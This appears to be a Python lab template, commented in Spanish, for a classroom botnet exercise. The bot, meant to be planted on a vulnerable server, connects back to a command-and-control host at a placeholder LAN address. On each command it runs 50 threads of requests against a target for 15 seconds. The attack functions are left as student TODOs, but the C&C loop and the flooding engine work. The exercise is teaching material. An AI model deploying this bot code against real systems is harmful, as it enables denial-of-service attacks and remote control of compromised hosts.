"""
Script que queremos inyectar al servidor vulnerable

HAY QUE RELLENAR LOS ATAQUES.
"""

import socket
import threading
import requests
import time
import random

# --- CONFIGURACIÓN ---
CNC_IP = "192.168.Y.Y"   # IP del servidor CnC (tu ordenador)
CNC_PORT = 9999

TARGET_IP = "192.168.X.X" # IP de la Víctima (Servidor a atacar)
BASE_URL = f"http://{TARGET_IP}"

# Número de hilos simultáneos
NUM_HILOS = 50

# --- ZONA DEL ALUMNO: ARSENAL ---
# Tarea: Rellena estas funciones con las peticiones que has diseñado
# tras investigar el servidor.

def ataque1():
    """
    Se ejecuta cuando el C&C manda: A1
    """
    try:
        # TODO: Escribe aquí tu código para el primer ataque
        requests.get("url", data='{"data":key}')
        requests.post("url", data='{"data":key}')
        pass
    except:
        pass

def ataque2():
    """
    Se ejecuta cuando el C&C manda: A2
    """
    try:
        # TODO: Escribe aquí tu código para el segundo ataque
        pass
    except:
        pass

def ataque3():
    """
    Se ejecuta cuando el C&C manda: A3
    """
    try:
        # TODO: Escribe aquí tu código para el tercer ataque
        pass
    except:
        pass

# --- MOTOR DEL BOT (NO MODIFICAR, LECTURA INTERESANTE) ---

def ejecutar_ataque(tipo_ataque):
    print(f"[*] ¡ORDEN RECIBIDA!: {tipo_ataque} (Lanzando {NUM_HILOS} hilos)")
    
    funcion_objetivo = None
    if tipo_ataque == "A1": funcion_objetivo = ataque1
    elif tipo_ataque == "A2": funcion_objetivo = ataque2
    elif tipo_ataque == "A3": funcion_objetivo = ataque3
    
    if not funcion_objetivo:
        print(f"[!] No sé cómo ejecutar el ataque: {tipo_ataque}")
        return

    stop_event = threading.Event()

    # Lanzamos los hilos de ataque
    for _ in range(NUM_HILOS):
        t = threading.Thread(target=bucle_infinito, args=(funcion_objetivo,stop_event))
        t.daemon = True 
        t.start()
        
    # Mantenemos el ataque 15 segundos y paramos automáticamente
    # para no quemar la red ni los portátiles
    time.sleep(15)
    print("[*] Fin de la ráfaga. Esperando nuevas órdenes...")
    stop_event.set()

def bucle_infinito(funcion, stop_event):
    while not stop_event.is_set():
        funcion()
        # Pequeña pausa técnica para evitar bloqueos locales
        time.sleep(0.02)

def conectar_cnc():
    print(f"[*] Buscando al Maestro en {CNC_IP}:{CNC_PORT}...")
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:    # Esta es la línea que hace la magia
                s.connect((CNC_IP, CNC_PORT))
                print("[+] CONECTADO. Esperando señal de ataque...")
                
                while True:
                    # Esperamos órdenes de texto plano
                    orden = s.recv(1024).decode().strip()
                    if not orden: break
                    
                    # Ejecutamos en hilo aparte para seguir escuchando
                    threading.Thread(target=ejecutar_ataque, args=(orden,)).start()
                    
        except ConnectionRefusedError:
            print("[-] C&C no disponible. Reintentando en 5s...")
            time.sleep(5)
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    conectar_cnc()
